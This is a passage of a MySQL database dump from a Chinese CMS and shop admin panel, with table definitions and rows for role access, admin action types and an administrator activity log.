# Host: localhost  (Version 5.5.5-10.1.16-MariaDB)
# Date: 2016-12-14 18:04:55
# Generator: MySQL-Front 5.4  (Build 3.40)
# Internet: http://www.mysqlfront.de/

/*!40101 SET NAMES utf8 */;

#
# Structure for table "np_access"
#

DROP TABLE IF EXISTS `np_access`;
CREATE TABLE `np_access` (
  `role_id` smallint(6) unsigned NOT NULL COMMENT '组ID',
  `node_id` smallint(6) unsigned NOT NULL COMMENT '节点ID',
  `status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '状态',
  `level` tinyint(1) NOT NULL COMMENT '节点等级',
  `module` varchar(50) DEFAULT NULL COMMENT '节点名',
  KEY `groupId` (`role_id`),
  KEY `nodeId` (`node_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='权限表';

#
# Data for table "np_access"
#

/*!40000 ALTER TABLE `np_access` DISABLE KEYS */;
INSERT INTO `np_access` VALUES (1,1,1,1,'admin'),(1,2,1,2,'settings'),(1,3,1,3,'info'),(1,4,1,3,'basic'),(1,5,1,3,'lang'),(1,6,1,3,'image'),(1,7,1,3,'safe'),(1,8,1,3,'email'),(1,9,1,2,'theme'),(1,10,1,3,'template'),(1,11,1,3,'member'),(1,12,1,3,'shop'),(1,13,1,2,'category'),(1,14,1,3,'category'),(1,15,1,3,'model'),(1,16,1,3,'fields'),(1,17,1,3,'type'),(1,18,1,2,'content'),(1,19,1,3,'content'),(1,20,1,3,'banner'),(1,21,1,3,'ads'),(1,22,1,3,'comment'),(1,23,1,3,'cache'),(1,24,1,3,'recycle'),(1,25,1,2,'user'),(1,26,1,3,'member'),(1,27,1,3,'level'),(1,28,1,3,'admin'),(1,29,1,3,'role'),(1,30,1,3,'node'),(1,31,1,2,'wechat'),(1,32,1,3,'keyword'),(1,33,1,3,'auto'),(1,34,1,3,'attention'),(1,35,1,3,'config'),(1,36,1,3,'menu'),(1,37,1,2,'shop'),(1,38,1,3,'goods'),(1,39,1,3,'orders'),(1,40,1,3,'category'),(1,41,1,3,'type'),(1,42,1,3,'brand'),(1,43,1,3,'comment'),(1,44,1,3,'accountwater'),(1,45,1,3,'settings'),(1,46,1,2,'expand'),(1,47,1,3,'log'),(1,48,1,3,'databack'),(1,49,1,3,'upgrade'),(1,50,1,3,'elogo'),(1,51,1,3,'visit');
/*!40000 ALTER TABLE `np_access` ENABLE KEYS */;

#
# Structure for table "np_action"
#

DROP TABLE IF EXISTS `np_action`;
CREATE TABLE `np_action` (
  `id` smallint(6) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(30) NOT NULL DEFAULT '' COMMENT '行为唯一标识',
  `title` varchar(80) NOT NULL DEFAULT '' COMMENT '行为说明',
  `remark` varchar(140) NOT NULL DEFAULT '' COMMENT '描述',
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=67 DEFAULT CHARSET=utf8 COMMENT='行为表';

#
# Data for table "np_action"
#

/*!40000 ALTER TABLE `np_action` DISABLE KEYS */;
INSERT INTO `np_action` VALUES (1,'admin_login','管理员登录',''),(2,'admin_logout','管理员退出',''),(3,'admin_added','添加管理员',''),(4,'admin_editor','编辑管理员',''),(5,'admin_delete','删除管理员',''),(6,'config_editor','修改设置',''),(7,'role_added','添加管理组',''),(8,'role_editor','编辑管理组',''),(9,'role_remove','删除管理组',''),(10,'user_added','添加管理员',''),(11,'user_editor','编辑管理员',''),(12,'user_remove','删除管理员',''),(13,'level_added','添加会员等级(组)',''),(14,'level_editor','编辑会员等级(组)',''),(15,'level_remove','删除会员等级(组)',''),(16,'member_added','添加会员',''),(17,'member_editor','编辑会员',''),(18,'member_remove','删除会员',''),(19,'node_added','添加节点',''),(20,'node_editor','编辑节点',''),(21,'node_remove','删除节点',''),(22,'node_sort','节点排序',''),(23,'model_sort','模型排序',''),(24,'model_added','添加模型',''),(25,'model_editor','编辑模型',''),(26,'model_remove','删除模型',''),(27,'category_sort','栏目排序',''),(28,'category_added','添加栏目',''),(29,'category_editor','编辑栏目',''),(30,'category_remove','删除栏目',''),(31,'fields_added','添加自定义字段',''),(32,'fields_editor','编辑自定义字段',''),(33,'fields_remove','删除自定义字段',''),(34,'databack_back','备份数据库',''),(35,'databack_down','下载备份',''),(36,'databack_remove','删除备份文件',''),(37,'databack_reduction','还原数据库',''),(38,'wechat_config_editor','修改微信配置',''),(39,'wechat_keyword_added','添加微信回复',''),(40,'wechat_keyword_editor','编辑微信回复',''),(41,'wechat_keyword_remove','删除微信回复',''),(42,'wechat_keyword_auto','编辑微信自动回复',''),(43,'wechat_keyword_attention','编辑微信关注回复',''),(44,'banner_added','添加幻灯片',''),(45,'banner_image_added','添加幻灯片图片',''),(46,'banner_editor','编辑幻灯片',''),(47,'banner_image_editor','编辑幻灯片图片',''),(48,'banner_remove','删除幻灯片',''),(49,'banner_image_remove','删除幻灯片图片',''),(50,'ads_added','添加广告',''),(51,'ads_editor','编辑广告',''),(52,'ads_remove','删除广告',''),(53,'comment_editor','编辑评论',''),(54,'comment_remove','删除评论',''),(55,'type_added','添加分类',''),(56,'type_editor','编辑分类',''),(57,'type_remove','删除分类',''),(58,'content_sort','内容排序',''),(59,'content_added','添加内容',''),(60,'content_editor','编辑内容',''),(61,'content_recycle','删除内容到回收站',''),(62,'content_reduction','还原内容',''),(63,'content_remove','删除内容',''),(64,'theme_editor','编辑模板',''),(65,'upload_file','上传文件','');
/*!40000 ALTER TABLE `np_action` ENABLE KEYS */;

#
# Structure for table "np_action_log"
#

DROP TABLE IF EXISTS `np_action_log`;
CREATE TABLE `np_action_log` (
  `action_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '行为ID',
  `user_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '执行用户ID',
  `action_ip` varchar(255) NOT NULL COMMENT '执行行为者IP',
  `model` varchar(50) NOT NULL DEFAULT '' COMMENT '触发行为的模型方法',
  `record_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '触发行为的数据ID',
  `remark` varchar(255) NOT NULL DEFAULT '' COMMENT '日志备注',
  `create_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '执行行为的时间',
  KEY `action_ip` (`action_ip`),
  KEY `action_id` (`action_id`),
  KEY `user_id` (`user_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='行为日志表';

#
# Data for table "np_action_log"
#

/*!40000 ALTER TABLE `np_action_log` DISABLE KEYS */;
INSERT INTO `np_action_log` VALUES (2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476847387),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1476844010),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1476843981),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1476762641),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1476697582),(0,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1476697541),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1476697342),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1477537825),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1477708915),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1477708849),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1477708837),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1477708801),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1477708707),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477702530),(6,1,'0.0.0.0[IANA保留地址]','Settings-email',0,'',1477647538),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1477646281),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477634732),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477535058),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1476697326),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1476697126),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1476697117),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1476697110),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1476697078),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1476697063),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1476672226),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476671135),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1476671082),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476671072),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1476669171),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1476438851),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476438846),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476438665),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476438631),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1476438454),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476438448),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476438164),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476437767),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476437506),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476437431),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476437374),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476437326),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476437215),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476437099),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476436961),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476436917),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476436905),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476436504),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476436378),(2,1,'0.0.0.0[IANA保留地址]','Settings-info',0,'',1476436357),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1476670282),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1476783832),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476669343),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1476669330),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476669324),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1476669280),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476669272),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1476669247),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476669222),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1477876907),(6,1,'0.0.0.0[IANA保留地址]','Settings-safe',0,'',1477705258),(6,1,'0.0.0.0[IANA保留地址]','Settings-safe',0,'',1477647450),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476843986),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477386898),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1477386985),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477121866),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1477123972),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477123980),(6,1,'0.0.0.0[IANA保留地址]','Settings-safe',0,'',1477127576),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477269636),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477386999),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1476935189),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1477475417),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477452344),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477104987),(6,1,'0.0.0.0[IANA保留地址]','Settings-image',0,'',1477016789),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1476934454),(6,1,'0.0.0.0[IANA保留地址]','Settings-image',0,'',1477016781),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1476934464),(6,1,'0.0.0.0[IANA保留地址]','Settings-image',0,'',1477647348),(6,1,'0.0.0.0[IANA保留地址]','Settings-lang',0,'',1477647056),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477646659),(6,1,'0.0.0.0[IANA保留地址]','Settings-email',0,'',1477363777),(6,1,'0.0.0.0[IANA保留地址]','Settings-safe',0,'',1477363762),(6,1,'0.0.0.0[IANA保留地址]','Settings-image',0,'',1477363267),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1477362917),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477361285),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1477360507),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477357167),(6,1,'0.0.0.0[IANA保留地址]','Settings-email',0,'',1477270354),(6,1,'0.0.0.0[IANA保留地址]','Settings-email',0,'',1477270343),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1477646638),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1477624910),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477461343),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1477875361),(53,1,'0.0.0.0[IANA保留地址]','Content-comment',1,'',1475719029),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1476435772),(2,1,'0.0.0.0[IANA保留地址]','Settings-info',0,'',1476436306),(2,1,'0.0.0.0[IANA保留地址]','Settings-info',0,'',1476436350),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1476847681),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1476928063),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1476935288),(6,1,'0.0.0.0[IANA保留地址]','Settings-lang',0,'',1476947586),(6,1,'0.0.0.0[IANA保留地址]','Settings-lang',0,'',1476949634),(6,1,'0.0.0.0[IANA保留地址]','Settings-lang',0,'',1476949644),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477011171),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477537833),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477616453),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1477710079),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477710088),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1477710129),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477710155),(6,1,'0.0.0.0[IANA保留地址]','Settings-email',0,'',1477710669),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477721446),(27,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1477726460),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1477729127),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477729136),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477875091),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1477875244),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1477875252),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1477875348),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477877088),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1477877220),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1477877359),(6,1,'0.0.0.0[IANA保留地址]','Settings-image',0,'',1477877369),(29,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1477877836),(29,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1477877902),(27,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1477878617),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1477883762),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477885954),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1477886335),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477893390),(6,1,'0.0.0.0[IANA保留地址]','Settings-image',0,'',1477904767),(6,1,'0.0.0.0[IANA保留地址]','Settings-image',0,'',1477904789),(6,1,'0.0.0.0[IANA保留地址]','Settings-image',0,'',1477905152),(24,1,'0.0.0.0[IANA保留地址]','Category-model',0,'',1477906583),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477971514),(25,1,'0.0.0.0[IANA保留地址]','Category-model',0,'',1477972225),(29,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1477972387),(29,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1477972393),(29,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1477972479),(29,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1477972485),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1477978264),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1477981983),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1477982054),(29,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1477982744),(29,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1477982824),(28,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1477983038),(30,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1477983045),(28,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1477983110),(30,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1477983228),(27,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1477983977),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1477983993),(26,1,'0.0.0.0[IANA保留地址]','Category-model',0,'',1477984185),(23,1,'0.0.0.0[IANA保留地址]','Category-model',0,'',1477984275),(24,1,'0.0.0.0[IANA保留地址]','Category-model',0,'',1477984457),(26,1,'0.0.0.0[IANA保留地址]','Category-model',0,'',1477984970),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478049138),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478064904),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478133242),(31,1,'0.0.0.0[IANA保留地址]','Category-fields',0,'',1478140163),(32,1,'0.0.0.0[IANA保留地址]','Category-fields',0,'',1478143783),(32,1,'0.0.0.0[IANA保留地址]','Category-fields',0,'',1478144784),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478151401),(33,1,'0.0.0.0[IANA保留地址]','Category-fields',0,'',1478160629),(31,1,'0.0.0.0[IANA保留地址]','Category-fields',0,'',1478160681),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478220541),(31,1,'0.0.0.0[IANA保留地址]','Category-fields',0,'',1478223976),(33,1,'0.0.0.0[IANA保留地址]','Category-fields',0,'',1478224647),(55,1,'0.0.0.0[IANA保留地址]','Category-type',0,'',1478231219),(56,1,'0.0.0.0[IANA保留地址]','Category-type',0,'',1478231492),(57,1,'0.0.0.0[IANA保留地址]','Category-type',0,'',1478231540),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478237535),(6,1,'0.0.0.0[IANA保留地址]','Settings-lang',0,'',1478246176),(6,1,'0.0.0.0[IANA保留地址]','Settings-lang',0,'',1478251788),(6,1,'0.0.0.0[IANA保留地址]','Settings-lang',0,'',1478252697),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478305824),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478327126),(6,1,'0.0.0.0[IANA保留地址]','Settings-image',0,'',1478330155),(6,1,'0.0.0.0[IANA保留地址]','Settings-image',0,'',1478330172),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478482112),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478486522),(34,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1478488671),(34,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1478488700),(34,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1478488714),(34,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1478489287),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478496643),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478565115),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1478566261),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478568734),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478572549),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478587018),(16,1,'0.0.0.0[IANA保留地址]','User-member',0,'',1478590195),(17,1,'0.0.0.0[IANA保留地址]','User-member',0,'',1478592744),(13,1,'0.0.0.0[IANA保留地址]','User-level',0,'',1478596094),(14,1,'0.0.0.0[IANA保留地址]','User-level',0,'',1478596512),(15,1,'0.0.0.0[IANA保留地址]','User-level',0,'',1478596549),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478651837),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478676429),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1478678770),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478679146),(16,1,'0.0.0.0[IANA保留地址]','User-member',0,'',1478680050),(16,1,'0.0.0.0[IANA保留地址]','User-member',0,'',1478680173),(3,1,'0.0.0.0[IANA保留地址]','User-admin',0,'',1478681282),(3,1,'0.0.0.0[IANA保留地址]','User-admin',0,'',1478681348),(4,1,'0.0.0.0[IANA保留地址]','User-admin',0,'',1478682582),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478738235),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478755982),(8,1,'0.0.0.0[IANA保留地址]','User-role',0,'',1478758255),(9,1,'0.0.0.0[IANA保留地址]','User-role',0,'',1478758711),(22,1,'0.0.0.0[IANA保留地址]','User-node',0,'',1478763208),(19,1,'0.0.0.0[IANA保留地址]','User-node',0,'',1478767117),(20,1,'0.0.0.0[IANA保留地址]','User-node',0,'',1478767463),(21,1,'0.0.0.0[IANA保留地址]','User-node',0,'',1478767475),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478824331),(34,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1478826329),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478829380),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478829581),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478829615),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478829656),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478829852),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478830185),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478830301),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478830515),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478830958),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478831253),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1478831524),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478831664),(34,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1478832912),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1478833282),(34,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1478833374),(34,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1478833960),(35,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1478834636),(36,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1478835261),(36,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1478835273),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478912509),(6,1,'0.0.0.0[IANA保留地址]','Wechat-config',0,'',1478921721),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1478932835),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1479084004),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1479103872),(34,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1479108085),(34,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1479112868),(34,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1479112975),(34,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1479113055),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1479169946),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1479172226),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1479172641),(31,1,'0.0.0.0[IANA保留地址]','Category-fields',0,'',1479174541),(33,1,'0.0.0.0[IANA保留地址]','Category-fields',0,'',1479174808),(53,1,'0.0.0.0[IANA保留地址]','Content-comment',0,'',1479260350),(53,1,'0.0.0.0[IANA保留地址]','Content-comment',0,'',1479260357),(44,1,'0.0.0.0[IANA保留地址]','Content-banner',0,'',1479264713),(6,1,'0.0.0.0[IANA保留地址]','Theme-template',0,'',1479268921),(6,1,'0.0.0.0[IANA保留地址]','Theme-template',0,'',1479268957),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1479274411),(6,1,'0.0.0.0[IANA保留地址]','Theme-member',0,'',1479275441),(6,1,'0.0.0.0[IANA保留地址]','Theme-member',0,'',1479275456),(46,1,'0.0.0.0[IANA保留地址]','Content-banner',0,'',1479287319),(44,1,'0.0.0.0[IANA保留地址]','Content-banner',0,'',1479288860),(46,1,'0.0.0.0[IANA保留地址]','Content-banner',0,'',1479288936),(34,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1479289211),(48,1,'0.0.0.0[IANA保留地址]','Content-banner',0,'',1479289234),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1479290071),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1479342736),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1479361778),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1479429905),(6,1,'0.0.0.0[IANA保留地址]','Theme-template',0,'',1479431593),(6,1,'0.0.0.0[IANA保留地址]','Theme-template',0,'',1479431615),(31,1,'0.0.0.0[IANA保留地址]','Category-fields',0,'',1479439576),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1479448140),(59,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479546914),(59,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479549337),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479549557),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1479688560),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1479688566),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479695523),(63,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479695985),(28,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1479696396),(28,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1479696422),(28,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1479696451),(28,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1479696466),(28,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1479696486),(28,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1479696507),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1479775210),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479786276),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479786331),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479786339),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479786997),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1479792761),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479793661),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479793740),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479793778),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479793837),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479794011),(63,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479794250),(59,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479794676),(59,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479807400),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479807639),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1479887216),(63,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479887291),(59,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479890947),(59,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479891040),(30,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1479891726),(28,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1479892081),(30,1,'0.0.0.0[IANA保留地址]','Category-category',0,'',1479893066),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1479947894),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1479965524),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479980858),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1479981340),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1480034518),(59,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1480036132),(59,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1480036283),(59,1,'0.0.0.0[IANA保留地址]','Content-content',0